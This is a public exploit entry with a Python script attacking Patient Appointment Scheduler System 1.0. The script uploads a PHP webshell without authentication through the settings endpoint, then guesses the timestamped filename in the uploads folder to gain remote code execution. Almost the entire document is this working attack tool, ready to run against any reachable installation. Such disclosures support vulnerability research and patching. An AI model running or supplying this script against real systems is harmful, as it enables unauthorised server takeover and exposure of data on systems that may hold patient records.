# Exploit Title: Patient Appointment Scheduler System 1.0 - Unauthenticated File Upload & Remote Code Execution (RCE)
# Date: 03/09/2021
# Exploit Author: a-rey 
# Vendor Homepage: https://www.sourcecodester.com/php/14928/patient-appointment-scheduler-system-using-php-free-source-code.html
# Software Link: https://www.sourcecodester.com/download-code?nid=14928
# Version: v1.0
# Tested on: Ubuntu 20.04.3 LTS (Focal Fossa) with XAMPP 8.0.10-0
# Exploit Write-Up: https://github.com/a-rey/exploits/blob/main/writeups/Patient_Appointment_Scheduler_System/v1.0/writeup.md

#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import time
import logging
import requests
import colorama
from colorama import Fore
colorama.init()
import argparse

BANNER = """"""


def exploit(url:str, file:str, delay:int) -> None:
  if not os.path.exists(file):
    logging.error(Fore.RED+'[-]'+Fore.RESET+f' Webshell payload "{file}"" does not exist?')
    return
  logging.info(Fore.BLUE+'[*]'+Fore.RESET+f' Uploading webshell payload "{os.path.basename(file)}" to {url}/uploads ...')
  uploadTime = int(time.time())
  r = requests.post(url + '/classes/SystemSettings.php', 
    files={'img' : (os.path.basename(file), open(file, 'rb'))},
    params={'f' : 'update_settings'},
    verify=False
  )
  if not r.ok:
    logging.error(Fore.RED+'[-]'+Fore.RESET+' HTTP upload request failed')
    return
  logging.info(Fore.BLUE+'[*]'+Fore.RESET+f' Finding new payload file name on target (+/- {delay} seconds) ...')
  for i in range(uploadTime - delay, uploadTime + delay + 1):
    r = requests.get(url + f'/uploads/{str(i)}_{os.path.basename(file)}', allow_redirects=False)
    logging.debug(Fore.YELLOW+'[+]'+Fore.RESET+f' Trying {url}/uploads/{str(i)}_{os.path.basename(file)} ...')
    if r.status_code != 302:
      logging.success(Fore.YELLOW+'[+]'+Fore.RESET+f' Webshell payload found on target at {url}/uploads/{str(i)}_{os.path.basename(file)}')
      return
  logging.error(Fore.RED+'[-]'+Fore.RESET+' Failed to find payload on target')
  logging.warning(Fore.RED+'[-]'+Fore.RESET+' Maybe need a larger delay or uploads directory is not writable?')
  return
  
  
if __name__ == '__main__':
  parser = argparse.ArgumentParser(formatter_class=argparse.RawDescriptionHelpFormatter, usage=BANNER)
  parser.add_argument('-u', '--url',     help='website URL',                                                  type=str, required=True)
  parser.add_argument('-p', '--payload', help='PHP webshell file to upload',                                  type=str, required=True)
  parser.add_argument('-d', '--delay',   help='delay (seconds) for file timestamp in payload name on target', type=int, required=False, default=60)
  parser.add_argument('--debug',         help='enable debugging output',                                      action='store_true', default=False)
  args = parser.parse_args()
  logging.basicConfig(format='[%(asctime)s][%(levelname)s] %(message)s', datefmt='%d %b %Y %H:%M:%S', level='INFO' if not args.debug else 'DEBUG')
  logging.SUCCESS = logging.CRITICAL + 1
  logging.addLevelName(logging.SUCCESS, '\033[0m\033[1;32mOK    : \033[0m')
  logging.addLevelName(logging.ERROR,   '\033[0m\033[1;31mERROR : \033[0m')
  logging.addLevelName(logging.WARNING, '\033[0m\033[1;33mWARN  : \033[0m')
  logging.addLevelName(logging.INFO,    '\033[0m\033[1;36mNOTE  : \033[0m')
  logging.success = lambda msg, *args: logging.getLogger(__name__)._log(logging.SUCCESS, msg, args)
  print(BANNER)
  exploit(args.url, args.payload, args.delay)